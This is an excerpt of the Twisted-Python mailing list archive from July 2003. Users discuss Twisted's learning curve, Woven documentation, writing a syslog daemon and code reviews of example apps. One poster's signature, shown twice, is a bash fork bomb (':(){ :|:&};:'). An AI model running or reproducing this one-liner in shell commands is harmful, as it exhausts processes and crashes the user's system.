> but Twisted is hard to understand. Perhaps you guys find the docs simple
> enough, but I just don't get a lot of the key concepts.

I think Twisted isn't so much complex as large.  It has many pieces, and can
do many things.  Some of those pieces can be complex (e.g. PB or Woven), but
different people use Twisted for a lot of different things.  It's only the
last month or so I've seriously looked a twisted.web; I've found plenty of
use for Twisted in things like implementing simple (and not so simple)
protocols.  In particular, simple multi-protocol support in one process was
a big drawcard for me.  Twisted made that stuff *much* simpler than any of
the alternatives I saw.

> The fact that there are so few examples of running ( and uptodate as
> mentioned by P. Lafoucriere ) apps available might be a clue. Just look at
> the whole RPYs-thing we had going some time ago. Web-development, or to be
> precise, running a full-scale webserver is why a lot of people look into
> Twisted in the first place. The lack of example-apps and obvious
> misunderstandings on how Twisted is meant to be used is what's holding
> Twisted back, IMHO.

This is an interesting point.  Most of the Twisted developers, I think,
didn't come to Twisted for the web stuff, at least not primarily.  Thus the
sudden interest in Twisted purely for its web capabilities has caught the
documentation a little off-guard.  I think people expect to see
documentation a little more geared towards web developers, and instead they
get a bunch of docs that barely mentions web until the sixth chapter.  

Also, Woven has been stable and well-documented for a really short period of
time.  It's not like it's been a year since it stabilised and was
documented and we have nothing to show for it -- rather, it's been perhaps 3
months, and we're just starting to see examples like Issues emerge.

Perhaps the confusion is that to fully use twisted web, you need to
understand:
   - Twisted basics, e.g. Deferreds and reactor.callLater
   - Twisted Web basics, e.g. Resources
   - Woven

But you don't necessarily need full mastery of all that to be productive --
I've seen someone start with the PicturePile tutorial, and extend it to have
captions, nicer layout, and other things without major difficulty.  They
didn't need Deferreds, they didn't need the reactor, and they didn't need to
use twisted.web.resoure.Resource directly, and so they had no problems
building upon the parts of Woven that PicturePile demonstrated.

Let me emphasise that: Twisted is actually pretty good at being modular.  If
you don't need something, you don't need to care about it.  So in a sense,
what we need isn't bigger and better omni-examples that do everything at
once (although they might still be useful) -- we need to help new users
filter out the bits of Twisted they don't need, so they can concentrate on
working with learning a manageable subset of it.

I think the PicturePile tutorial is a great example because of this -- you
can do an awful lot with very little.

So ideally we don't need a "how to use a database in a web page", we should
just need "how to use a database in Twisted" and "how to use deferred
results with Twisted Web".  [I think both of these topics are actually
answered pretty poorly at the moment; I think I can feel another bout of doc
hacking coming on...]

> I really hope the new Twisted-community page can bring some simple, well
> documented examples on how to do things. By the way things are going we'll
> probably have very good docs in a couple of months or so, but I want to
> implement a feature-rich webserver based on Twisted now, as I've described
> and nagged about in my postings on this list several times.

I don't see why we need a new "community" page to achieve this.  We have a
perfectly good mailing-list and website -- if someone has a great example,
we'll gladly use it!

> Anyway, I feel there is too much promise in the Twisted platform to let a
> few good examples scare alot of potential users away. I'm still working on a
> test-implementation of a webserver which hopefully will be easy enough to
> understand and deploy, extend and customize, written in a Twisted-way.

What do you mean by "implementation"?  Have you seen Moshe Zadka's
twisted-web Debian package that's being developed?

> Anyway, I'm going to ask again; any example, small and simple, showing how
> to implement a webserver serving static content *and* dynamic pages, not
> static pages like Issues or Bannerfish, using woven-forms and
> user-authentication, in a Twisted-compatible manner would be appreciated. If
> I'm the only one feeling this way, I'll shut up, dive into the docs again,
> try some more and keep silent while doing so. Hopefully I'll be able to
> learn Twisted and contribute something, not just nag, to a dedicated group
> of developers.

There's no need to shut up -- if you're confused or unsure how to do
something, then ask on the list and/or IRC.  I'd like to think we do a
fairly good job at helping, and conversations on the list can and do lead to
improvements in the docs.

-Andrew.




From andrew-twisted at puzzling.org  Thu Jul 10 01:30:03 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Thu, 10 Jul 2003 17:30:03 +1000
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F1318CF0D@its-xchg4.massey.ac.nz>
References: <1ED4ECF91CDED24C8D012BCF2B034F130256567F@its-xchg4.massey.ac.nz> <1ED4ECF91CDED24C8D012BCF2B034F1318CF0D@its-xchg4.massey.ac.nz>
Message-ID: <20030710073003.GB21625@frobozz>

On Thu, Jul 10, 2003 at 06:59:42PM +1200, Tony Meyer wrote:
> > Why?
> 
> Well, efficiency, for one.  timeit rates the single re 5-6 times faster than
> the proof of concept that you posted (corrected to work).  That's a
> considerable speed difference.

Note that the fact Moshe's splitting was incorrect is a good sign that REs
aren't easily readable and understandable ;)

That said, I'd be happy with either solution provided there's a decent set
of test cases for it -- that way I can be confident that it works without
even needing to read the code...  Of course, it's not up to me. :)

-Andrew.




From nbm at mithrandr.moria.org  Thu Jul 10 02:29:13 2003
From: nbm at mithrandr.moria.org (Neil Blakey-Milner)
Date: Thu, 10 Jul 2003 10:29:13 +0200
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <006f01c34676$9a28db80$0401a8c0@razor>
References: <006f01c34676$9a28db80$0401a8c0@razor>
Message-ID: <20030710082913.GA92306@mithrandr.moria.org>

On Thu 2003-07-10 (02:02), Thomas Weholt wrote:
> or is Twisted ... well, complicated. I've been programming for several years
> and I don't consider myself to be dumb, allthough not a genius either ;-) --
> but Twisted is hard to understand. Perhaps you guys find the docs simple
> enough, but I just don't get a lot of the key concepts.

Well, taking on the entireity of Twisted is complicated, but getting
things up and running requires very little code.  My main stumbling
block with Twisted is the lack of example doing-something-useful
applications.

I've tried to do my part in writing things like bannergrab, stikiwiki,
and tnntprss, but I really have no idea if they're good examples of how
to write things, so I can't really punt them.

Neil
-- 
Neil Blakey-Milner
nbm at mithrandr.moria.org



From 2002 at weholt.org  Wed Jul  9 03:22:49 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Wed, 9 Jul 2003 11:22:49 +0200
Subject: [Twisted-Python] Sample for using select/option with t.w.w.form.FormProcessor
References: <OF3DF17A7B.F75AB5E6-ONC1256D5C.004C3C60@uz.tengelmann.de>
Message-ID: <000001c346bd$73caa710$3ba8a8c0@gatsoft.no>

Any example on how to use twisted.web.woven.Formxxx would be nice :-)

Thomas
  ----- Original Message ----- 
  From: mmoellenbeck at plus.de 
  To: twisted-python at twistedmatrix.com 
  Sent: Monday, July 07, 2003 3:57 PM
  Subject: [Twisted-Python] Sample for using select/option with t.w.w.form.FormProcessor



  hi, 

  has anybody an example for using select/option with t.w.w.form.FormProcessor? 

  thanks and regarts

  Martin Moellenbeck 

------------------------------------------------------------------------------

-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030709/e09f2f43/attachment.html>

From m at moshez.org  Thu Jul 10 03:04:55 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 09:04:55 -0000
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <20030710082913.GA92306@mithrandr.moria.org>
References: <20030710082913.GA92306@mithrandr.moria.org>, <006f01c34676$9a28db80$0401a8c0@razor>
Message-ID: <20030710090455.6350.qmail@green.zadka.com>

On Thu, 10 Jul 2003, Neil Blakey-Milner <nbm at mithrandr.moria.org> wrote:

> I've tried to do my part in writing things like bannergrab, stikiwiki,
> and tnntprss, but I really have no idea if they're good examples of how
> to write things, so I can't really punt them.

It's fairly simple to find out: put them up on the web, announce them
here. You will likely get more commentary than you ever wanted and
will possibly lead to better docs [so we can prevent people from
making the same mistakes] and better code [if we find out our interfaces
don't suit the way people actually use stuff]. It would also, if you
actually read comments and act on them, lead to an improvement of
your examples.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From 2002 at weholt.org  Thu Jul 10 03:20:54 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Thu, 10 Jul 2003 11:20:54 +0200
Subject: [Twisted-Python] Is it just me ....
References: <006f01c34676$9a28db80$0401a8c0@razor> <20030710071941.GA21625@frobozz>
Message-ID: <001a01c346c4$90870d10$3ba8a8c0@gatsoft.no>

----- Original Message -----
From: "Andrew Bennetts" <andrew-twisted at puzzling.org>
To: <twisted-python at twistedmatrix.com>
Sent: Thursday, July 10, 2003 9:19 AM
Subject: Re: [Twisted-Python] Is it just me ....


> On Thu, Jul 10, 2003 at 02:02:47AM +0200, Thomas Weholt wrote:
> > or is Twisted ... well, complicated. I've been programming for several
years
> > and I don't consider myself to be dumb, allthough not a genius either
;-) --
> > but Twisted is hard to understand. Perhaps you guys find the docs simple
> > enough, but I just don't get a lot of the key concepts.
>
> I think Twisted isn't so much complex as large.  It has many pieces, and
can
> do many things.  Some of those pieces can be complex (e.g. PB or Woven),
but
> different people use Twisted for a lot of different things.  It's only the
> last month or so I've seriously looked a twisted.web; I've found plenty of
> use for Twisted in things like implementing simple (and not so simple)
> protocols.  In particular, simple multi-protocol support in one process
was
> a big drawcard for me.  Twisted made that stuff *much* simpler than any of
> the alternatives I saw.

Agree. I think resources are pretty easy to understand. Woven/Pages are not,
because there so much more happening that the user don't see. Resources has
a render-method which returns content you can send to the client. Or it
writes content to the client. Easy as pie. Woven on the other hand .... I'll
keep on modding the PicturePile-example and play around with the other
examples.

>
> > The fact that there are so few examples of running ( and uptodate as
> > mentioned by P. Lafoucriere ) apps available might be a clue. Just look
at
> > the whole RPYs-thing we had going some time ago. Web-development, or to
be
> > precise, running a full-scale webserver is why a lot of people look into
> > Twisted in the first place. The lack of example-apps and obvious
> > misunderstandings on how Twisted is meant to be used is what's holding
> > Twisted back, IMHO.
>
> This is an interesting point.  Most of the Twisted developers, I think,
> didn't come to Twisted for the web stuff, at least not primarily.  Thus
the
> sudden interest in Twisted purely for its web capabilities has caught the
> documentation a little off-guard.  I think people expect to see
> documentation a little more geared towards web developers, and instead
they
> get a bunch of docs that barely mentions web until the sixth chapter.

I've looked at and developed web-related things using Zope, implemented a
completly customized web-server based on a threaded
BaseHTTPServer-foundation, briefly looked at WebWare/SkunkWare/CherryPy and
at some point had a working web-something based on Medusa. They all fall
short in some place or another. Twisted is probably the closest I've come to
a server where I got full controll and at the same time can have a bunch of
working code to use. But as mentioned earlier, my webserver is not just
going to serve dynamic content, but also fetch alot of content from other
servers, so it's more than just a server. That's way threading/deferred are
so important, at least in my project, where there will be a lot of tasks
running inside a webserver doing jobs taking potentially along time,
fetching data from other servers, putting that data into a local database
etc.

>
> Also, Woven has been stable and well-documented for a really short period
of
> time.  It's not like it's been a year since it stabilised and was
> documented and we have nothing to show for it -- rather, it's been perhaps
3
> months, and we're just starting to see examples like Issues emerge.
>

Yes, and hopefully we'll see more very soon :-)

> Perhaps the confusion is that to fully use twisted web, you need to
> understand:
>    - Twisted basics, e.g. Deferreds and reactor.callLater
>    - Twisted Web basics, e.g. Resources
>    - Woven

Agree. But as I said earlier, Resources are pretty easy. Woven and deferreds
and reactor.callLater are completly different beasts.

> But you don't necessarily need full mastery of all that to be
productive --
> I've seen someone start with the PicturePile tutorial, and extend it to
have
> captions, nicer layout, and other things without major difficulty.  They
> didn't need Deferreds, they didn't need the reactor, and they didn't need
to
> use twisted.web.resoure.Resource directly, and so they had no problems
> building upon the parts of Woven that PicturePile demonstrated.

Yup. PicturePile has been and will be disected, ripped apart and put back
together in search of Woven-enlightenment. The problem is all the things
happening "automagically".
I need more testing to understand what is going on in the backgrounds.

> So ideally we don't need a "how to use a database in a web page", we
should
> just need "how to use a database in Twisted" and "how to use deferred
> results with Twisted Web".  [I think both of these topics are actually
> answered pretty poorly at the moment; I think I can feel another bout of
doc
> hacking coming on...]

Agree.

> > I really hope the new Twisted-community page can bring some simple, well
> > documented examples on how to do things. By the way things are going
we'll
> > probably have very good docs in a couple of months or so, but I want to
> > implement a feature-rich webserver based on Twisted now, as I've
described
> > and nagged about in my postings on this list several times.
>
> I don't see why we need a new "community" page to achieve this.  We have a
> perfectly good mailing-list and website -- if someone has a great example,
> we'll gladly use it!

The list and user-group has been very helpful and forthcoming so far, so
maybe not. The mentioning of more example-apps might have been what got me
to excited.

> > Anyway, I feel there is too much promise in the Twisted platform to let
a
> > few good examples scare alot of potential users away. I'm still working
on a
> > test-implementation of a webserver which hopefully will be easy enough
to
> > understand and deploy, extend and customize, written in a Twisted-way.
>
> What do you mean by "implementation"?  Have you seen Moshe Zadka's
> twisted-web Debian package that's being developed?

Eh ... no. All of my projects must run on both Linux and Windows, but if
there's a web-project based on Twisted anywhere I haven't seen allready I'm
very interested.

>
> > Anyway, I'm going to ask again; any example, small and simple, showing
how
> > to implement a webserver serving static content *and* dynamic pages, not
> > static pages like Issues or Bannerfish, using woven-forms and
> > user-authentication, in a Twisted-compatible manner would be
appreciated. If
> > I'm the only one feeling this way, I'll shut up, dive into the docs
again,
> > try some more and keep silent while doing so. Hopefully I'll be able to
> > learn Twisted and contribute something, not just nag, to a dedicated
group
> > of developers.
>
> There's no need to shut up -- if you're confused or unsure how to do
> something, then ask on the list and/or IRC.  I'd like to think we do a
> fairly good job at helping, and conversations on the list can and do lead
to
> improvements in the docs.
>
> -Andrew.

Thanks a million.

Thomas




From 2002 at weholt.org  Thu Jul 10 03:32:53 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Thu, 10 Jul 2003 11:32:53 +0200
Subject: [Twisted-Python] Implementing a syslog-deamon ??
Message-ID: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no>

Hi,

I was wondering if I could implement a fully syslog-compatible
syslog-deamon/server using Twisted? We need a syslog up and running as soon
as possible to let our firewall use it, due to some suspicion about hacking
etc. It would help alot of I could implement a syslog-deamon that put data
sent to it into a database, instead of to a file. The server must be able to
run on Windows.

This would also be a perfect oppertunity to show of Python, open-source and
Twisted to a group of people who adore Microsoft and Borland and think
python and all other scripting-languages are for kids and trivial,
non-critical things.

Anyway, any hint you can give me will be appreciated.

Best regards,
Thomas




From m at moshez.org  Thu Jul 10 03:48:33 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 09:48:33 -0000
Subject: [Twisted-Python] Implementing a syslog-deamon ??
In-Reply-To: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no>
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no>
Message-ID: <20030710094833.8146.qmail@green.zadka.com>

On Thu, 10 Jul 2003, "Thomas Weholt \( PRIVAT \)" <2002 at weholt.org> wrote:

> I was wondering if I could implement a fully syslog-compatible
> syslog-deamon/server using Twisted?

Yes it is. Writing a syslog is not extremely hard.
[Note that it will probably constrain your mounting order, since syslog
has to start pretty soon. OTOH, putting /usr/ on a different partition
than / is an obsolete idea, so that shouldn't be a big problem.]

> We need a syslog up and running as soon
> as possible to let our firewall use it, due to some suspicion about hacking
> etc.

"As soon as possible" and "implement my own" are usually at odds.

> It would help alot of I could implement a syslog-deamon that put data
> sent to it into a database, instead of to a file. The server must be able to
> run on Windows.

Why? What in syslog logs to a a syslog daemon? More importantly, syslog
relies on unix-specific APIs, IIRC, like named pipes or unix domain pipes.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From nbm at mithrandr.moria.org  Thu Jul 10 03:55:11 2003
From: nbm at mithrandr.moria.org (Neil Blakey-Milner)
Date: Thu, 10 Jul 2003 11:55:11 +0200
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <20030710090455.6350.qmail@green.zadka.com>
References: <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com>
Message-ID: <20030710095510.GB92306@mithrandr.moria.org>

On Thu 2003-07-10 (09:04), Moshe Zadka wrote:
> On Thu, 10 Jul 2003, Neil Blakey-Milner <nbm at mithrandr.moria.org> wrote:
> 
> > I've tried to do my part in writing things like bannergrab, stikiwiki,
> > and tnntprss, but I really have no idea if they're good examples of how
> > to write things, so I can't really punt them.
> 
> It's fairly simple to find out: put them up on the web, announce them
> here. You will likely get more commentary than you ever wanted and
> will possibly lead to better docs [so we can prevent people from
> making the same mistakes] and better code [if we find out our interfaces
> don't suit the way people actually use stuff]. It would also, if you
> actually read comments and act on them, lead to an improvement of
> your examples.

(and the trap is sprung...)

Bannergrab is at http://mithrandr.moria.org/code/bannergrab/ and it is
a simple SSH/SMTP banner grabber over a (bunch of) network range(s).
Not much I'd like done with it, but suggestions on what is good/bad
about it would be nice.  Also, a "so many concurrent clients" manager
like I used might be useful in general - what do others think?

Stikiwiki (which I've mentioned here before) is at
http://mithrandr.moria.org/code/stikiwiki/ and is a pretty featureless
Wiki-alike that uses docutils for backing format in a cog database.  I'd
be really interested in how Woven can work for me, especially refreshing
content after a POST that changes the content and/or doing a redirect
and so forth.  An example of newcred/woven.guard working against a
simple "user: password" style file or a simple "user":"password"
dictionary (ie, dealing with the perspective without storing perspective
information in the authentication backend) would be very useful to
people wanting to authenticate against existing databases or libraries
(like vpopmail).

tnntprss is at http://mithrandr.moria.org/code/tnntprss/ and it creates
a NNTP news server with newsgroups and content from RSS feeds.
Configuration of RSS feeds is probably the main issue here - I didn't
want to use web interfaces without understanding woven.guard/cred
better.  Understanding whether I'm using getServiceNamed in an
acceptable way would be nice.  I remember pynfo used adapters for
something similar - would that be more Twistedish (Twistedic?).

Neil
-- 
Neil Blakey-Milner
nbm at mithrandr.moria.org



From m at moshez.org  Thu Jul 10 06:00:20 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 12:00:20 -0000
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <20030710095510.GB92306@mithrandr.moria.org>
References: <20030710095510.GB92306@mithrandr.moria.org>, <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com>
Message-ID: <20030710120020.10507.qmail@green.zadka.com>

On Thu, 10 Jul 2003, Neil Blakey-Milner <nbm at mithrandr.moria.org> wrote:

> tnntprss is at http://mithrandr.moria.org/code/tnntprss/ and it creates
> a NNTP news server with newsgroups and content from RSS feeds.
> Configuration of RSS feeds is probably the main issue here - I didn't
> want to use web interfaces without understanding woven.guard/cred
> better.  Understanding whether I'm using getServiceNamed in an
> acceptable way would be nice.  I remember pynfo used adapters for
> something similar - would that be more Twistedish (Twistedic?).

Well, if you have two services that rely on each other, a nice way to
deal with that is MultiService. Have a convenicence function which
returns a MultiService, all loaded up with both services, created
from arguments to this function.

def getTNNTPService(newsDir, syndDir, name):
    s = app.MultiService(name)
    NewsService(newsDir, "news", s) 
    SyndicationService(syndDir, "syndication", s) 
    return s

Then a user can use the following to run your code:

'''
# File: tnntp.tpy
#
# Location of news
newsDir = "/tmp/newsdb"
# Location of syndication
syndDir = "/tmp/synddb"

from tnntprss import getTNNTPService
from twisted.internetet import app

application = app.Application("tnntprss")
getTNNTPService(newsDir, syndDir, "tnntp).setServiceParent(application)
'''

Then,

% twistd -y tnntp.tpy

works.

Or, you might want to support an even more extreme method of hiding
implementation details from users:

def simpGetTNNTPService(storage, name):
    s = app.MultiService(name)
    NewsService(os.path.join(storage, "newsdb"), "news", s) 
    SyndicationService(os.path.join(storage, "synddb"), "syndication", s) 
    return s

And have config files that look like

'''
# File: tnntp2.tpy
#
# Location of internal storage
storage = "/var/lib/tnntp"

from tnntprss import simpGetTNNTPService
from twisted.internetet import app

application = app.Application("tnntprss")
simpGetTNNTPService(storage, "tnntp").setServiceParent(application)
'''

And again

% twistd -y tnntp2.tpy

works.

Another thing you can do when you convert to a package [and you should,
regardless!] is to supply tap plugins that would look like

# tnntprss/tap.py
from twisted.python import usage
from tnntprss import simpGetTNNTPService

class Options(usage.Options):

    optParameters = [['storage', 's', '/var/lib/tnntp', "Where to store files"]]

def updateApplication(application, config):
    simpGetTNNTPService(config['storage'], "tnntp"
    ).setServiceParent(application)

and then put a file like

# tntprss/plugins.tml
register("TNNTPRss", "tnntprss.tap", type='tap', tapname='tnntprss')

So that the user can

% mktap tnntprss --storage=/home/moshez/.temp
% twistd -f tnntprss.tap

Other remarks:

* startScheduler should be called from startService, not __init__, to
  support persistence
* similarily, all reactor.callLater() results should be saved from
  an attribute of the SyndicationService, which is then .cancelled()
  in stopService
* 9119 is a hardcoded number. Probably should be given in an argument
  to news service. Of course, the above get...Service() calls should
  be modified to accept that argument, blah blah blah.
* I'd prefer it if .listenTCP was not called from __init__, but instead,
  an easy way to get the right factory was supplied:

class NewsService(...):
    ...
    def getFactory(self):
        return news.UsenetServerFactory(self.backend, None)

Then, in the configurator:

s = simpGetTNNTPService(storage, "tnntp")
s.setServiceParent(application)
application.listenTCP(119, s.getServiceNamed("news").getFactory())
[and again, mutatis mutandis for the other options]

Rationale: easier support for non-common listening options [what if you
want to only listen on 127.0.0.1, so that only you can read the news?
what if you wanted to listen on several ports to defeat firewalls?]

* Nit: rssparser.py is a DOS file, all other are unix files.

I hope that matches your expectations of how thoroughly we can pick
on you :)
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From nbm at mithrandr.moria.org  Thu Jul 10 06:24:02 2003
From: nbm at mithrandr.moria.org (Neil Blakey-Milner)
Date: Thu, 10 Jul 2003 14:24:02 +0200
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <20030710120020.10507.qmail@green.zadka.com>
References: <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com> <20030710120020.10507.qmail@green.zadka.com>
Message-ID: <20030710122402.GA10423@mithrandr.moria.org>

On Thu 2003-07-10 (12:00), Moshe Zadka wrote:
> Well, if you have two services that rely on each other, a nice way to
> deal with that is MultiService. Have a convenicence function which
> returns a MultiService, all loaded up with both services, created
> from arguments to this function.
...

> Or, you might want to support an even more extreme method of hiding
> implementation details from users:

...

> Another thing you can do when you convert to a package [and you should,
> regardless!] is to supply tap plugins that would look like

...

> Other remarks:
> 
> * startScheduler should be called from startService, not __init__, to
>   support persistence
> * similarily, all reactor.callLater() results should be saved from
>   an attribute of the SyndicationService, which is then .cancelled()
>   in stopService
> * 9119 is a hardcoded number. Probably should be given in an argument
>   to news service. Of course, the above get...Service() calls should
>   be modified to accept that argument, blah blah blah.
> * I'd prefer it if .listenTCP was not called from __init__, but instead,
>   an easy way to get the right factory was supplied:

...

> Rationale: easier support for non-common listening options [what if you
> want to only listen on 127.0.0.1, so that only you can read the news?
> what if you wanted to listen on several ports to defeat firewalls?]
> 
> I hope that matches your expectations of how thoroughly we can pick
> on you :)

More, more!

Thanks for the critique - I'll try apply this as I'm able to and get
back to everyone once I have an updated version.  I'll also see about
codifying your suggestions and having a before-and-after type document
with real examples.

(Offer time-permittingly open to others if they critique or suggest
stuff that's generally considered good advice.)

Thanks,

Neil
-- 
Neil Blakey-Milner
nbm at mithrandr.moria.org



From m at moshez.org  Thu Jul 10 06:28:45 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 12:28:45 -0000
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <20030710095510.GB92306@mithrandr.moria.org>
References: <20030710095510.GB92306@mithrandr.moria.org>, <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com>
Message-ID: <20030710122845.11361.qmail@green.zadka.com>

On Thu, 10 Jul 2003, Neil Blakey-Milner <nbm at mithrandr.moria.org> wrote:

> Stikiwiki (which I've mentioned here before) is at
> http://mithrandr.moria.org/code/stikiwiki/ and is a pretty featureless
> Wiki-alike that uses docutils for backing format in a cog database.  I'd
> be really interested in how Woven can work for me, especially refreshing
> content after a POST that changes the content and/or doing a redirect
> and so forth.  An example of newcred/woven.guard working against a
> simple "user: password" style file or a simple "user":"password"
> dictionary (ie, dealing with the perspective without storing perspective
> information in the authentication backend) would be very useful to
> people wanting to authenticate against existing databases or libraries
> (like vpopmail).

I can't critique most of the Woven stuff in Stikiwiki, nor the user model,
but I will not avoid several comments:

It is better if StikiService had done all the creating a StikiSite work
in startService, added a method:

    def getResource(self):
        return ss

Then, a similar scheme to the one I detailed in my last mail with
multi-services would probably allow you to do something like:

'''
s = getStikiService("/tmp/cog", "stiki")
s.setParent(application)
application.listenTCP(8080,
                       server.Site(s.getServiceNamed("stiki").getResource()))
'''

etc. etc.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From m at moshez.org  Thu Jul 10 06:41:25 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 12:41:25 -0000
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <20030710095510.GB92306@mithrandr.moria.org>
References: <20030710095510.GB92306@mithrandr.moria.org>, <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com>
Message-ID: <20030710124125.11536.qmail@green.zadka.com>

On Thu, 10 Jul 2003, Neil Blakey-Milner <nbm at mithrandr.moria.org> wrote:

> Bannergrab is at http://mithrandr.moria.org/code/bannergrab/ and it is
> a simple SSH/SMTP banner grabber over a (bunch of) network range(s).
> Not much I'd like done with it, but suggestions on what is good/bad
> about it would be nice.  Also, a "so many concurrent clients" manager
> like I used might be useful in general - what do others think?

It's not that dissimilar with some code we have in mail. Unfortunately,
a bunch of that code is not that great an example code either.

You probably don't want to call reactor.stop(). Ever.
What you want is for Manager to create a deferred which is callbacked
when there are no more slaves or waiting slaves, and let someone
else call reactor.stop() if he should wish it. I'm not exactly sure
if this is the right way, of if it should be converted to an
ApplicationService -- that depends on what you want to do.

For example, I could see an excellent case for just removing the prints
in favour of saving the data and then callback'ing the deferred, and
wrapping it all in a nice function, which can be called like this:

checkHosts(('moshez.org', 25), ('moshez.org', 22)
).addCallback(util.println
).addCallback(lambda _: reactor.stop())

One nit: protocol.slashr means you are changing a class attribute.
That's probably a bad idea. It would be better to inherit:

class UnixMyProtocol(MyProtocol):
    delimiter = '\n'

and do
  if not slashr:
      slave.protocol = UnixMyProtocol
in the relevant places.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From tv at twistedmatrix.com  Thu Jul 10 08:11:19 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 10 Jul 2003 17:11:19 +0300
Subject: [Twisted-Python] Implementing a syslog-deamon ??
In-Reply-To: <20030710094833.8146.qmail@green.zadka.com>
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no> <20030710094833.8146.qmail@green.zadka.com>
Message-ID: <20030710141119.GA15922@lapdog>

On Thu, Jul 10, 2003 at 09:48:33AM -0000, Moshe Zadka wrote:
> Why? What in syslog logs to a a syslog daemon? More importantly, syslog
> relies on unix-specific APIs, IIRC, like named pipes or unix domain pipes.

	Umm. The syslog network protocol is just brain-dead simple
	UDP. It's trivial to run such a server on Windows.

-- 
:(){ :|:&};:



From tv at twistedmatrix.com  Thu Jul 10 08:17:32 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 10 Jul 2003 17:17:32 +0300
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <20030710124125.11536.qmail@green.zadka.com>
References: <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com> <20030710124125.11536.qmail@green.zadka.com>
Message-ID: <20030710141732.GB15922@lapdog>

On Thu, Jul 10, 2003 at 12:41:25PM -0000, Moshe Zadka wrote:
> checkHosts(('moshez.org', 25), ('moshez.org', 22)
> ).addCallback(util.println
> ).addCallback(lambda _: reactor.stop())

	*vomit*

d = checkHosts(('moshez.org', 25), ('moshez.org', 22))
d.addCallback(util.println)
d.addCallback(lambda _: reactor.stop())

	anyone?

-- 
:(){ :|:&};:



From uwe at oss4u.com  Thu Jul 10 09:24:46 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Thu, 10 Jul 2003 08:24:46 -0700
Subject: [Twisted-Python] Implementing a syslog-deamon ??
In-Reply-To: <20030710094833.8146.qmail@green.zadka.com>
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no> <20030710094833.8146.qmail@green.zadka.com>
Message-ID: <200307100824.46462.uwe@oss4u.com>

On Thursday 10 July 2003 02:48 am, Moshe Zadka wrote:
> On Thu, 10 Jul 2003, "Thomas Weholt \( PRIVAT \)" <2002 at weholt.org> wrote:
> > I was wondering if I could implement a fully syslog-compatible
> > syslog-deamon/server using Twisted?
>
> Yes it is. Writing a syslog is not extremely hard.
> [Note that it will probably constrain your mounting order, since syslog
> has to start pretty soon. OTOH, putting /usr/ on a different partition
> than / is an obsolete idea, so that shouldn't be a big problem.]

Not an obsolete idea. Just not too commonly used anymore. Look at large 
mission critical unix deployments and you'll see the split of / /usr /var 
etc. And basically: just fill up your harddrive and see what happens. A lot 
of daemons will stop working. If you have different partitions / will still 
have room for logfiles / configfiles.

> > We need a syslog up and running as soon
> > as possible to let our firewall use it, due to some suspicion about
> > hacking etc.
>
> "As soon as possible" and "implement my own" are usually at odds.
>
> > It would help alot of I could implement a syslog-deamon that put data
> > sent to it into a database, instead of to a file. The server must be able
> > to run on Windows.
>
> Why? What in syslog logs to a a syslog daemon? More importantly, syslog
> relies on unix-specific APIs, IIRC, like named pipes or unix domain pipes.

Nothing in syslog logs to syslog (except you set it up that way). What he is 
trying to do is to receive the log from his firewall which obviously - as do 
most firewalls - provides a syslog facility to send the logs somewhere else ( 
most "out of the box" systems do that due to lack of own harddrive)



	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From m at moshez.org  Thu Jul 10 09:33:26 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 15:33:26 -0000
Subject: [Twisted-Python] My pet peeve ugly coding style
